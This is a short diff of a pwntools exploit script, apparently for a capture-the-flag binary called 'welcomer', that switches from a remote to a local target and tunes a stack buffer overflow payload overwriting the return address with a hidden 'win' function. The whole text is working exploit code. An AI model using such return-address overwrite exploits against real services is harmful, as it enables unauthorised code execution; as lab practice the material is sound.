@@ -2,7 +2,7 @@
 from pwn import *
 
 exe = context.binary = ELF(args.EXE or './welcomer')
-io = remote('172.17.0.2', 5000)
+#io = remote('172.17.0.2', 5000)
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -17,10 +17,9 @@ tbreak main
 continue
 '''.format(**locals())
 
-#io = start()
+io = start()
 win_addr = p64(exe.sym['s3creT_b4s3'])
-payload = b'A'* 40
-payload += p64(0x4011d5) # ret addr, for 8 bit rsp pad (kalau ga di tambah padding movaps segfault)
+payload = b'A'* 44
 payload += win_addr
 io.sendline(payload)
 io.interactive()
